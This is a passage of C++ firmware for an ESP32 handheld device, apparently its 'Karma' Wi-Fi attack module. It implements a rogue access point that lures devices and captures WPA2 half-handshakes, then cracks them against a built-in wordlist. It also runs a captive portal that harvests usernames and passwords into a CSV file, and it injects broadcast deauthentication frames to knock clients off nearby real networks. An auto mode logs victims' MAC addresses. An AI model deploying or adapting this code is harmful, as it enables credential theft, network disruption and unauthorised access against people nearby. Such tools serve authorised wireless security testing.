            if (wpacrack::verifyHandshake(line.c_str(), ssid, apMac, staMac, aNonce, sNonce,
                                          eapol, eapolLen, mic, &ctx, sha1)) {
                strncpy(found, line.c_str(), sizeof(found) - 1); done = true;
            }
        }
        if (wl) wl.close();
    }

    // built-in list
    for (int i = 0; i < wpacrack::kBuiltinCount && !done && !aborted; i++) {
        tried++;
        uint32_t now = millis();
        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
            drawStatic(); status(wpacrack::kBuiltins[i]); lastRedraw = now;
        }
        if (now - lastRedraw >= 300) {
            lastRedraw = now; status(wpacrack::kBuiltins[i]);
            if (inputHandler.getKeyboardInput() == 'q') { aborted = true; break; }
            vTaskDelay(1);
        }
        if (wpacrack::verifyHandshake(wpacrack::kBuiltins[i], ssid, apMac, staMac, aNonce, sNonce,
                                      eapol, eapolLen, mic, &ctx, sha1)) {
            strncpy(found, wpacrack::kBuiltins[i], sizeof(found) - 1); done = true;
        }
    }
    mbedtls_md_free(&ctx);

    dm.fillRect(4, statY, SCREEN_WIDTH - 8, LINE_HEIGHT * 3, TFT_BLACK);
    dm.setCursor(4, statY);
    if (done) {
        dm.setTextColor(TFT_GREEN);
        char b[80]; snprintf(b, sizeof(b), "FOUND: %s", found); dm.println(b);
        if (sdCardManager.canAccessSD()) {           // log it (AP already down → GDMA-safe)
            File f = SD.open(SD_DIR_KARMA "/cracked.csv", FILE_APPEND);
            if (f) { f.printf("%s,%s\n", ssid, found); f.close(); }
        }
    } else if (aborted) {
        dm.setTextColor(TFT_YELLOW); dm.println("Aborted.");
    } else {
        dm.setTextColor(TFT_YELLOW); dm.println("Not in wordlist.");
    }

    // Whether or not we cracked it, the half-handshake .cap is already on the SD —
    // tell the user the exact file, so a failed/aborted on-device crack can move to a PC.
    if (capName && *capName) {
        dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_CYAN);
        char cp[64]; snprintf(cp, sizeof(cp), ".cap: /apps/karma/%.30s", capName);
        dm.println(cp);
        if (!done) {
            dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x7BEF);
            dm.println("Move to PC for aircrack/hashcat");
        }
    }
}

// interactive=true → called from the live harvest list: show result, wait for a
// key, and return to the caller (which resumes harvest) instead of the CLI.
static void karmaHandshake(const char* ssid, uint8_t channel, bool interactive) {
    DisplayManager& dm = displayManager;

    if (!roguehs::begin(ssid, channel)) {
        dm.clearScreen(); dm.setCursor(4, outputY); dm.setTextColor(TFT_RED);
        dm.println("Karma: rogue-AP start failed");
        if (interactive) {
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.println("[any key] back to list");
            while (!inputHandler.getKeyboardInput()) vTaskDelay(pdMS_TO_TICKS(20));
        } else dm.printCommandScreen();
        return;
    }

    uint32_t lastDraw = 0;
    bool redraw = true, crackReq = false;
    while (true) {
        roguehs::poll();                                  // re-beacon + answer clients
        const roguehs::State& s = roguehs::state();

        if (LockScreenManager::getInstance().consumeJustUnlocked()) redraw = true;
        uint32_t now = millis();
        if ((redraw || now - lastDraw > 400) && !dm.isBlocked()) {
            drawHeader("WPA2", 0, 0);
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("SSID "); dm.setTextColor(TFT_WHITE);
            char ss[34]; snprintf(ss, sizeof(ss), "%.31s", ssid); dm.println(ss);
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("BSSID "); dm.setTextColor(TFT_WHITE);
            char bm[20]; snprintf(bm, sizeof(bm), "%02X:%02X:%02X:%02X:%02X:%02X",
                s.apMac[0], s.apMac[1], s.apMac[2], s.apMac[3], s.apMac[4], s.apMac[5]);
            dm.printText(bm);
            dm.setTextColor(0x7BEF); dm.printText(" CH "); dm.setTextColor(TFT_WHITE);
            char c[6]; snprintf(c, sizeof(c), "%u", channel); dm.printText(c);
            dm.printText(" ");                                  // BSSID identity: randomized vs real
            dm.setTextColor(s.macRandomized ? TFT_GREEN : TFT_YELLOW);
            dm.println(s.macRandomized ? "rnd" : "REAL");
            dm.printSeparator();
            // live stage diagnostic — shows how far each client gets
            dm.setCursor(4, dm.getCursorY());
            char st[48]; snprintf(st, sizeof(st), "Prb:%lu Ath:%lu Asc:%lu M1:%lu",
                (unsigned long)s.probes, (unsigned long)s.auths,
                (unsigned long)s.assocs, (unsigned long)s.m1Sent);
            dm.setTextColor(TFT_WHITE); dm.println(st);
            dm.setCursor(4, dm.getCursorY());
            if (s.gotM2) {
                char m[46]; snprintf(m, sizeof(m), "M2! STA %02X:%02X:%02X:%02X:%02X:%02X",
                    s.staMac[0], s.staMac[1], s.staMac[2], s.staMac[3], s.staMac[4], s.staMac[5]);
                dm.setTextColor(TFT_GREEN); dm.println(m);
            } else if (s.assocs) {
                dm.setTextColor(TFT_YELLOW); dm.println("Associated - awaiting M2...");
            } else {
                dm.setTextColor(0x4208); dm.println("Baiting - waiting for client...");
            }
            dm.printSeparator();
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF);
            dm.println(s.gotM2 ? "[c] crack  [q] stop" : "[q] stop");
            lastDraw = now; redraw = false;
        }
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if ((k == 'c' || k == 'C') && s.gotM2) { crackReq = true; break; }
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    // bring WiFi down first (SD-safe), then read the result. state() stays valid
    // after end() (the static isn't cleared until the next begin()), so a reference
    // avoids copying the now ~1KB State onto the stack.
    roguehs::end();
    delay(50);
    const roguehs::State& snap = roguehs::state();

    // aircrack/hashcat-ready .cap: beacon (ESSID) + injected M1 + sniffed M2.
    // capName holds the file actually written (never overwrites prior captures).
    char capName[48];
    bool capSaved = karmaSaveCap(ssid, snap, capName, sizeof(capName));

    bool didCrack = false;
    if (crackReq && snap.gotM2) {
        karmaCrack(ssid, snap.apMac, snap.staMac, snap.anonce, snap.snonce,
                   snap.eapol, snap.eapolLen, snap.mic, capSaved ? capName : nullptr);
        didCrack = true;
    }

    if (!didCrack) {
        dm.clearScreen();
        dm.setCursor(4, outputY);
        if (snap.gotM2) { dm.setTextColor(TFT_GREEN);  dm.println("Half-handshake (M2) captured!"); }
        else            { dm.setTextColor(TFT_YELLOW); dm.println("No M2 captured."); }
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(TFT_WHITE);
        if (snap.gotM2) dm.println("ANonce known - [c] to crack");
        else            dm.println("No client completed the handshake");
        if (capSaved) {
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(TFT_CYAN);
            char cp[56]; snprintf(cp, sizeof(cp), "Saved /apps/karma/%.30s", capName);
            dm.println(cp);
        }
    }

    if (interactive) {
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(0x7BEF); dm.println("[any key] back to list");
        while (!inputHandler.getKeyboardInput()) vTaskDelay(pdMS_TO_TICKS(20));
    } else {
        dm.printCommandScreen();
    }
}

// ════════════════════════════════════════════════════════════════════════════════
// Phase 4 — open soft-AP + captive portal (credential capture)
// Thin wrapper over the shared CaptivePortal (wifi/core/captive_portal). Karma only
// adds the on-screen UI and persists captured creds to /apps/karma/creds.csv on
// exit — written AFTER CaptivePortal::end() drops the AP (GDMA-safe).
// ════════════════════════════════════════════════════════════════════════════════
static void karmaPortal(const char* ssid, bool interactive) {
    DisplayManager& dm = displayManager;
    char target[33]; strncpy(target, ssid, 32); target[32] = '\0';

    CaptivePortal* cp = new CaptivePortal();
    if (!cp) {
        dm.clearScreen(); dm.setCursor(4, outputY); dm.setTextColor(TFT_RED);
        dm.println("Karma: portal alloc failed");
        if (!interactive) dm.printCommandScreen();
        return;
    }

    // Pick the page (built-ins + SD .html) before the AP comes up (SD read is idle/safe).
    // Scan karma's own portal dir AND eviltwin's — so templates dropped in either work.
    char tplLabel[24] = "Generic WiFi";
    CpChoice ch;
    if (cpPickTemplate(SD_DIR_KARMA_PORTAL, ch, SD_DIR_EVILPORTAL)) {
        if (ch.builtin >= 0) {
            cp->useBuiltin(ch.builtin);
            snprintf(tplLabel, sizeof(tplLabel), "%.23s", cpBuiltinName(ch.builtin));
        } else if (cp->loadTemplate(ch.sdPath)) {
            const char* base = strrchr(ch.sdPath, '/'); base = base ? base + 1 : ch.sdPath;
            snprintf(tplLabel, sizeof(tplLabel), "%.23s", base);
        }
    } else {                                  // user cancelled the picker → abort cleanly
        delete cp;
        if (!interactive) dm.printCommandScreen();
        return;
    }
    cp->begin(target, /*open=*/true);

    uint32_t lastDraw = 0;
    bool redraw = true;
    while (true) {
        cp->poll();
        if (LockScreenManager::getInstance().consumeJustUnlocked()) redraw = true;
        uint32_t now = millis();
        if ((redraw || now - lastDraw > 500) && !dm.isBlocked()) {
            drawHeader("PORT", 0, 0);
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("SSID "); dm.setTextColor(TFT_WHITE);
            char s[34]; snprintf(s, sizeof(s), "%.31s", target); dm.println(s);
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("Clients "); dm.setTextColor(TFT_WHITE);
            char c[6]; snprintf(c, sizeof(c), "%d", cp->clients()); dm.println(c);
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("SD ");
            dm.setTextColor(sdCardManager.canAccessSD() ? TFT_GREEN : TFT_RED);
            dm.println(sdCardManager.canAccessSD() ? "creds.csv on exit" : "none (RAM only)");
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.printText("Page "); dm.setTextColor(TFT_WHITE);
            dm.println(tplLabel);
            dm.printSeparator();
            dm.setCursor(4, dm.getCursorY());
            char cap[40]; snprintf(cap, sizeof(cap), "Captured: %d", cp->credCount());
            dm.setTextColor(cp->credCount() ? TFT_GREEN : 0x4208); dm.println(cap);
            if (cp->credCount()) {
                dm.setCursor(4, dm.getCursorY());
                dm.setTextColor(TFT_WHITE);
                char l[48]; snprintf(l, sizeof(l), "%.20s / %.16s", cp->lastUser(), cp->lastPass());
                dm.println(l);
            }
            dm.printSeparator();
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(0x7BEF); dm.println("[q] stop");
            lastDraw = now; redraw = false;
        }
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    cp->end();   // AP down → SD writes now GDMA-safe

    int saved = 0, total = cp->storedCount();
    if (sdCardManager.canAccessSD() && total > 0) {
        sdCardManager.ensureDir(SD_DIR_KARMA);
        bool isNew = !SD.exists(SD_DIR_KARMA "/creds.csv");
        File f = SD.open(SD_DIR_KARMA "/creds.csv", FILE_APPEND);
        if (f) {
            if (isNew) f.println("ssid,user,pass");
            const CpCred* cr = cp->creds();
            for (int i = 0; i < total; i++) f.printf("%s,%s,%s\n", target, cr[i].user, cr[i].pass);
            f.close();
            saved = total;
        }
    }
    int credCount = cp->credCount();
    delete cp;

    dm.clearScreen();
    dm.setCursor(4, outputY);
    if (credCount) { dm.setTextColor(TFT_GREEN);  dm.println("Credentials captured!"); }
    else           { dm.setTextColor(TFT_YELLOW); dm.println("No credentials captured."); }
    dm.setCursor(4, dm.getCursorY());
    char r[60];
    if (saved) snprintf(r, sizeof(r), "Saved %d to /apps/karma/creds.csv", saved);
    else       snprintf(r, sizeof(r), "%d captured (no SD)", credCount);
    dm.setTextColor(TFT_WHITE); dm.println(r);

    if (interactive) {
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(0x7BEF); dm.println("[any key] back to list");
        while (!inputHandler.getKeyboardInput()) vTaskDelay(pdMS_TO_TICKS(20));
    } else {
        dm.printCommandScreen();
    }
}

// ════════════════════════════════════════════════════════════════════════════════
// Phase 5 — Auto mode: hands-free harvest → bait sweep.
// Cycles forever (until [q]): harvest probe requests for a window, then bait the most-
// wanted SSIDs one at a time with the rogue-AP half-handshake. Every client that
// completes M2 is saved to a crackable .cap and logged to /apps/karma/connects.csv.
// Crack the .caps later with `cc`. Capture-only (no inline crack) so the sweep stays
// fast; portals need interaction so they stay manual ([p]).
// ════════════════════════════════════════════════════════════════════════════════
#define KM_AUTO_HARVEST_MS 30000u   // listen window before each sweep
#define KM_AUTO_BAIT_MS    20000u   // max time per target (or until M2)
#define KM_AUTO_TOP        8        // most-wanted SSIDs baited per sweep
#define KM_AUTO_BAIT_CH    6        // clients scan all channels → any works

static void autoLogConnect(const char* ssid, const uint8_t* sta) {
    if (!sdCardManager.canAccessSD()) return;
    sdCardManager.ensureDir(SD_DIR_KARMA);
    bool isNew = !SD.exists(SD_DIR_KARMA "/connects.csv");
    File f = SD.open(SD_DIR_KARMA "/connects.csv", FILE_APPEND);
    if (!f) return;
    if (isNew) f.println("time,ssid,sta_mac,vendor,type");
    char ts[24]; ClockManager::instance().getTimestamp(ts, sizeof(ts));
    if (!ts[0]) snprintf(ts, sizeof(ts), "@%lums", (unsigned long)millis());
    OuiInfo oi = ouiLookup(sta);
    f.printf("%s,%s,%02X:%02X:%02X:%02X:%02X:%02X,%s,%s\n", ts, ssid,
             sta[0], sta[1], sta[2], sta[3], sta[4], sta[5],
             oi.vendor ? oi.vendor : "?", oi.type ? oi.type : "?");
    f.close();
}

// Auto-mode live view: same SSID table as the interactive harvest, plus a status line.
// Captured nets are green with a trailing '*'; the current bait target row is highlighted.
// target==nullptr → HARVEST phase; else BAIT phase (st carries the live stage counters).
// rotPage is used only in HARVEST (auto-scrolls the list); in BAIT the page follows the target.
static void autoDrawTable(const char* target, uint32_t remainMs, int idx, int total,
                          int caps, const roguehs::State* st, int rotPage, bool deauthing) {
    DisplayManager& dm = displayManager;
    if (dm.isBlocked()) return;

    int n = s_netCount;
    int totalPages = n ? (n + KM_RPP - 1) / KM_RPP : 1;
    int order[KM_NET_MAX];
    if (n) buildOrder(order, n);

    int page = rotPage;
    if (target && *target) {                       // follow the target so its row is visible
        for (int i = 0; i < n; i++) if (strcmp(s_nets[order[i]].ssid, target) == 0) { page = i / KM_RPP; break; }
    }
    if (page >= totalPages) page = totalPages - 1;
    if (page < 0) page = 0;

    drawHeader("AUTO", page, n ? totalPages : 0);

    // status line
    dm.setCursor(4, dm.getCursorY());
    char b[52];
    if (target && *target) {
        const char* m2 = (st && st->gotM2) ? "YES" : "no";
        snprintf(b, sizeof(b), "BAIT%s %d/%d %lus Asc:%lu M2:%s", deauthing ? "+D" : "", idx, total,
                 (unsigned long)(remainMs / 1000), st ? (unsigned long)st->assocs : 0, m2);
        dm.setTextColor(st && st->gotM2 ? TFT_GREEN : TFT_YELLOW);
    } else {
        snprintf(b, sizeof(b), "HARVEST %lus  SSIDs:%d  Caps:%d",
                 (unsigned long)(remainMs / 1000), n, caps);
        dm.setTextColor(TFT_GREEN);
    }
    dm.println(b);

    // column header
    dm.setCursor(8, dm.getCursorY()); dm.setTextColor(0x7BEF);
    dm.printText("SSID");
    dm.setCursor(196, dm.getCursorY()); dm.printText("DEV");
    dm.setCursor(232, dm.getCursorY()); dm.printText("HIT");
    dm.setCursor(280, dm.getCursorY()); dm.printText("RSSI");
    dm.println("");
    dm.printSeparator();

    int32_t baseY = dm.getCursorY() + 1;
    if (n == 0) {
        dm.setCursor(4, baseY + 4); dm.setTextColor(0x7BEF);
        dm.println("Listening for probe requests...");
    } else {
        int start = page * KM_RPP, end = start + KM_RPP < n ? start + KM_RPP : n;
        for (int i = start; i < end; i++) {
            const KmNet& net = s_nets[order[i]];
            int32_t ry = baseY + (i - start) * LINE_HEIGHT;
            bool isTarget = target && *target && strcmp(net.ssid, target) == 0;
            if (isTarget) {
                dm.fillRect(0, ry - 1, SCREEN_WIDTH, LINE_HEIGHT, 0x0841);
                dm.setCursor(0, ry); dm.setTextColor(TFT_YELLOW); dm.printText(">");
            }
            uint16_t col = net.captured ? TFT_GREEN : (isTarget ? TFT_YELLOW : TFT_WHITE);
            dm.setCursor(8, ry); dm.setTextColor(col);
            char nm[24]; snprintf(nm, sizeof(nm), "%.19s%s", net.ssid, net.captured ? "*" : "");
            dm.printText(nm);
            char v[12];
            dm.setCursor(196, ry); dm.setTextColor(TFT_CYAN);
            snprintf(v, sizeof(v), "%u", net.devs); dm.printText(v);
            dm.setCursor(232, ry); dm.setTextColor(col);
            snprintf(v, sizeof(v), "%lu", (unsigned long)net.hits); dm.printText(v);
            dm.setCursor(280, ry); dm.setTextColor(0x7BEF);
            snprintf(v, sizeof(v), "%d", net.rssi); dm.printText(v);
        }
    }

    dm.setCursor(0, baseY + KM_RPP * LINE_HEIGHT + 2);
    dm.printSeparator();
    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF); dm.println("[v] caps  [q] stop  (* = captured)");
}

// Modal list of the SSIDs whose handshake we've captured this auto session. Blocks
// until a key ([a]/[l] page, any other key returns to the live auto view).
static void autoShowCaptured() {
    DisplayManager& dm = displayManager;
    int cap[KM_NET_MAX], cn = 0;
    for (int i = 0; i < s_netCount; i++) if (s_nets[i].captured) cap[cn++] = i;
    const int RPP = 9;
    int page = 0;
    while (true) {
        int pages = cn ? (cn + RPP - 1) / RPP : 1;
        if (page >= pages) page = pages - 1;
        drawHeader("CAPS", page, pages);
        dm.setCursor(4, dm.getCursorY());
        char b[40]; snprintf(b, sizeof(b), "%d handshake(s) captured", cn);
        dm.setTextColor(TFT_GREEN); dm.println(b);
        dm.printSeparator();
        if (cn == 0) {
            dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x7BEF);
            dm.println("None yet - keep baiting.");
        } else {
            int start = page * RPP, end = start + RPP < cn ? start + RPP : cn;
            for (int i = start; i < end; i++) {
                dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_WHITE);
                char l[44]; snprintf(l, sizeof(l), "%2d. %.34s", i + 1, s_nets[cap[i]].ssid);
                dm.println(l);
            }
        }
        dm.printSeparator();
        dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x7BEF);
        dm.println(cn > RPP ? "[a]/[l] page   any key = back" : "[any key] back");
        while (true) {
            char k = inputHandler.getKeyboardInput();
            if ((k == 'l' || k == 'L') && page < pages - 1) { page++; break; }
            if ((k == 'a' || k == 'A') && page > 0)          { page--; break; }
            if (k) return;                                   // any other key dismisses
            vTaskDelay(pdMS_TO_TICKS(15));
        }
    }
}

// Broadcast deauth (src = real AP) so its clients drop + re-scan and hit our clone.
static void injectDeauth(const uint8_t* apBssid) {
    uint8_t f[26] = {0};
    f[0] = 0xC0;                               // mgmt, subtype 12 = deauth
    memset(f + 4, 0xFF, 6);                    // DA = broadcast
    memcpy(f + 10, apBssid, 6);                // SA  = real AP
    memcpy(f + 16, apBssid, 6);                // BSSID = real AP
    f[24] = 0x07;                              // reason 7
    esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
}

// ── SSID-keyed helpers for reactive bait (target may be a probe we never harvested) ──
static int kmFindNet(const char* ssid) {
    for (int i = 0; i < s_netCount; i++) if (strcmp(s_nets[i].ssid, ssid) == 0) return i;
    return -1;
}
static bool kmBaitable(const char* ssid) {            // unknown SSIDs are baitable
    int i = kmFindNet(ssid);
    return (i < 0) ? true : !s_nets[i].captured;
}
static void kmMarkCaptured(const char* ssid) {        // add a row if reactively captured an unharvested SSID
    int i = kmFindNet(ssid);
    if (i < 0 && s_netCount < KM_NET_MAX) {
        i = s_netCount++;
        KmNet& n = s_nets[i];
        strncpy(n.ssid, ssid, 32); n.ssid[32] = '\0';
        n.devs = 0; n.hits = 0; n.lastBaitMs = millis();
    }
    if (i >= 0) s_nets[i].captured = true;
}

// deauth=true (km auto deauth): also deauth nearby present APs so devices drop + probe.
// Reactive: while baiting one SSID we follow live probes — if a device probes for a
// different un-captured SSID, retarget the clone to it on the spot (silent, no deauth).
static void karmaAuto(bool deauth) {
    DisplayManager& dm = displayManager;
    if (!ensureBuffers()) {
        freeBuffers();
        dm.clearScreen(); dm.setCursor(4, outputY); dm.setTextColor(TFT_RED);
        dm.println("Karma: PSRAM alloc failed");
        dm.printCommandScreen();
        return;
    }
    int  caps = 0;
    bool quit = false;

    while (!quit) {
        // ── harvest window ──
        harvestStart();
        uint8_t ch = 1; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        uint32_t t0 = millis(), lastHop = t0, lastDraw = 0, lastPage = t0;
        int rotPage = 0;
        while (!quit) {
            uint32_t now = millis();
            if (now - t0 >= KM_AUTO_HARVEST_MS) break;
            if (now - lastHop > 250) { ch = (ch % 13) + 1; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); lastHop = now; }
            drainRing();
            if (now - lastPage > 3000) {                     // auto-scroll the table hands-free
                int tp = s_netCount ? (s_netCount + KM_RPP - 1) / KM_RPP : 1;
                rotPage = (rotPage + 1) % tp; lastPage = now; lastDraw = 0;
            }
            if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
            if (now - lastDraw > 400) { autoDrawTable(nullptr, KM_AUTO_HARVEST_MS - (now - t0), 0, 0, caps, nullptr, rotPage, false); lastDraw = now; }
            char k = inputHandler.getKeyboardInput();
            if (k == 'q' || k == 'Q') { quit = true; break; }
            else if (k == 'v' || k == 'V') { autoShowCaptured(); lastDraw = 0; }
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        harvestStop();
        if (quit) break;

        // ── bait sweep ──
        // Pick UNCAPTURED SSIDs, least-recently-baited first (so we round-robin the
        // whole field instead of looping the same top-8), popularity as the tiebreak.
        // Captured SSIDs are skipped forever — no wasted re-baiting.
        int n = s_netCount;
        if (n == 0) continue;
        int idx[KM_NET_MAX], m = 0;
        for (int i = 0; i < n; i++) if (!s_nets[i].captured) idx[m++] = i;
        if (m == 0) continue;                                         // all captured → re-harvest
        for (int a = 1; a < m; a++) {                                 // insertion sort, best first
            int key = idx[a], b = a - 1;
            while (b >= 0) {
                const KmNet& x = s_nets[idx[b]]; const KmNet& y = s_nets[key];
                bool worse = (x.lastBaitMs > y.lastBaitMs) ||
                             (x.lastBaitMs == y.lastBaitMs && x.devs < y.devs);
                if (!worse) break;
                idx[b + 1] = idx[b]; b--;
            }
            idx[b + 1] = key;
        }
        int total = m < KM_AUTO_TOP ? m : KM_AUTO_TOP;

        // deauth-assist: scan nearby PRESENT APs once (post-harvestStop, promiscuous off).
        // The baited SSIDs come from probe requests = networks devices WANT but aren't on,
        // so their APs usually aren't here. Instead we deauth the APs devices ARE on, to
        // force them to disconnect and PROBE their saved list — then they discover our
        // clones of those absent SSIDs. So the deauth target is the present APs, not the bait.
        struct ApInfo { uint8_t bssid[6]; uint8_t ch; } aps[24];
        int apCount = 0;
        if (deauth) {
            dm.clearScreen(); dm.setCursor(4, outputY); dm.setTextColor(TFT_CYAN);
            dm.println("Scanning nearby APs to deauth...");
            int sc = WiFi.scanNetworks();
            for (int k = 0; k < sc && apCount < 24; k++) {
                memcpy(aps[apCount].bssid, WiFi.BSSID(k), 6);
                aps[apCount].ch = (uint8_t)WiFi.channel(k);
                apCount++;
            }
            WiFi.scanDelete();
        }
        bool dzActive = deauth && apCount > 0;

        bool engineUp = false;
        int  dRot = 0;                                                // rotates which present AP we kick
        for (int i = 0; i < total && !quit; i++) {
            int ni = idx[i];
            char target[33]; strncpy(target, s_nets[ni].ssid, 32); target[32] = '\0';
            s_nets[ni].lastBaitMs = millis();                         // mark baited (rotation)
            // Bring the AP up ONCE per sweep, then just retarget — no per-target WiFi churn.
            if (!engineUp) { if (!roguehs::begin(target, KM_AUTO_BAIT_CH)) continue; engineUp = true; }
            else           { roguehs::retarget(target, KM_AUTO_BAIT_CH); }
            char curTarget[33]; strncpy(curTarget, target, sizeof(curTarget)); curTarget[32] = '\0';
            uint32_t t0b = millis(), lastDraw = 0, lastDeauth = 0, lastSwitch = millis();
            while (!quit) {
                roguehs::poll();
                const roguehs::State& st = roguehs::state();
                uint32_t now = millis();
                if (st.gotM2) break;                                  // captured → next target
                if (now - t0b >= KM_AUTO_BAIT_MS) break;              // timed out → next target
                // reactive: a device just probed for a different un-captured SSID, and the
                // current target has no association in progress → follow the probe.
                if (st.assocs == 0 && now - lastSwitch > 1500) {
                    char hint[33];
                    if (roguehs::nextProbeHint(hint, sizeof(hint)) &&
                        strcmp(hint, curTarget) != 0 && kmBaitable(hint)) {
                        roguehs::retarget(hint, KM_AUTO_BAIT_CH);
                        strncpy(curTarget, hint, sizeof(curTarget)); curTarget[32] = '\0';
                        int hi = kmFindNet(curTarget); if (hi >= 0) s_nets[hi].lastBaitMs = now;
                        t0b = now; lastSwitch = now; lastDraw = 0;
                        continue;
                    }
                }
                if (dzActive && now - lastDeauth > 800) {            // kick a present AP so its clients re-scan
                    ApInfo& ap = aps[dRot % apCount];
                    esp_wifi_set_channel(ap.ch, WIFI_SECOND_CHAN_NONE);
                    injectDeauth(ap.bssid); injectDeauth(ap.bssid);
                    esp_wifi_set_channel(KM_AUTO_BAIT_CH, WIFI_SECOND_CHAN_NONE);  // back to the clone's channel
                    dRot++; lastDeauth = now;
                }
                if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
                if (now - lastDraw > 300) { autoDrawTable(curTarget, KM_AUTO_BAIT_MS - (now - t0b), i + 1, total, caps, &st, 0, dzActive); lastDraw = now; }
                char k = inputHandler.getKeyboardInput();
                if (k == 'q' || k == 'Q') { quit = true; break; }
                else if (k == 'v' || k == 'V') {            // view captured; don't penalize bait timer
                    uint32_t vs = millis(); autoShowCaptured(); t0b += millis() - vs; lastDraw = 0;
                }
                vTaskDelay(pdMS_TO_TICKS(5));
            }
            if (roguehs::state().gotM2) {                            // GDMA: pause promiscuous for the SD write
                const roguehs::State& s = roguehs::state();
                { ScopedPromiscPause _; karmaSaveCap(curTarget, s, nullptr, 0); autoLogConnect(curTarget, s.staMac); }
                kmMarkCaptured(curTarget);                            // skip it from now on (adds row if reactive/new)
                caps++;
            }
        }
        if (engineUp) roguehs::end();                                 // one teardown per sweep
        delay(30);
        // loop back to harvest (continuous) until [q]
    }

    harvestStop();
    roguehs::end();
    WiFi.mode(WIFI_STA);
    freeBuffers();

    dm.clearScreen();
    dm.setCursor(4, outputY); dm.setTextColor(caps ? TFT_GREEN : TFT_YELLOW);
    char b[48]; snprintf(b, sizeof(b), "Auto stopped - %d handshake(s)", caps);
    dm.println(b);
    if (caps) {
        dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_WHITE);
        dm.println("Saved to /apps/karma - crack with cc");
    }
    dm.printCommandScreen();
}

// ── entry point ─────────────────────────────────────────────────────────────────
void runKarma(char* args) {
    // ── subcommand: km hs <ssid> [ch]  → WPA2 handshake bait ──
    if (args && *args) {
        char a[96]; strncpy(a, args, sizeof(a) - 1); a[sizeof(a) - 1] = '\0';
        char* tok = strtok(a, " ");
        if (tok && (strcasecmp(tok, "auto") == 0 || strcasecmp(tok, "a") == 0)) {
            char* d = strtok(nullptr, " ");
            bool deauth = d && (strcasecmp(d, "deauth") == 0 || strcasecmp(d, "d") == 0);
            karmaAuto(deauth);
            return;
        }
        if (tok && strcasecmp(tok, "hs") == 0) {
            char* ss = strtok(nullptr, " ");
            char* ch = strtok(nullptr, " ");
            if (!ss || !*ss) {
                displayManager.clearScreen();
                displayManager.setCursor(4, outputY);
                displayManager.setTextColor(TFT_YELLOW);
                displayManager.println("Usage: km hs <ssid> [ch 1-13]");
                displayManager.printCommandScreen();
                return;
            }
            int c = ch ? atoi(ch) : 1; if (c < 1 || c > 13) c = 1;
            karmaHandshake(ss, (uint8_t)c, false);
            return;
        }
        if (tok && (strcasecmp(tok, "portal") == 0 || strcasecmp(tok, "p") == 0)) {
            char* ss = strtok(nullptr, "");        // rest of line = SSID (allows spaces)
            while (ss && *ss == ' ') ss++;
            if (!ss || !*ss) {
                displayManager.clearScreen();
                displayManager.setCursor(4, outputY);
                displayManager.setTextColor(TFT_YELLOW);
                displayManager.println("Usage: km portal <ssid>");
                displayManager.printCommandScreen();
                return;
            }
            karmaPortal(ss, false);
            return;
        }
        // Any other non-empty arg is a typo, not a mode → show the command's help
        // instead of silently starting a harvest run.
        Utils::printUsage("km");
        return;
    }

    if (!ensureBuffers()) {
        freeBuffers();
        displayManager.clearScreen();
        displayManager.setCursor(4, outputY);
        displayManager.setTextColor(TFT_RED);
        displayManager.println("Karma: PSRAM alloc failed");
        displayManager.printCommandScreen();
        return;
    }

    // promiscuous probe sniff — MGMT only, channel hop 1..13
    harvestStart();
    uint8_t ch = 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    int  view = VIEW_NETS;
    int  netPage = 0, netSel = 0, devPage = 0, devSel = 0;
    uint32_t lastDraw = 0, lastHop = 0, lastFp = 0;
    const uint32_t DRAW_MS = 400, HOP_MS = 250, FP_MS = 1500;
    const uint8_t  BAIT_CH = 6;   // bait AP channel (clients scan all → any works)
    bool redraw = true;

    while (true) {
        uint32_t now = millis();

        if (LockScreenManager::getInstance().consumeJustUnlocked()) redraw = true;

        if (now - lastHop > HOP_MS) {
            ch = (ch % 13) + 1;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            lastHop = now;
        }

        drainRing();

        // refresh the fingerprint clustering only while the Devices view is up
        if (view == VIEW_DEVS && now - lastFp > FP_MS) {
            rebuildDevices();
            lastFp = now;
            redraw = true;
        }

        if (redraw || now - lastDraw > DRAW_MS) {
            if (view == VIEW_NETS) drawNets(ch, netPage, netSel);
            else                   drawDevices(devPage, devSel);
            lastDraw = now;
            redraw = false;
        }

        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;

        if (k == 'v' || k == 'V') {
            view = (view == VIEW_NETS) ? VIEW_DEVS : VIEW_NETS;
            if (view == VIEW_DEVS) { rebuildDevices(); lastFp = now; }
            redraw = true;
        }
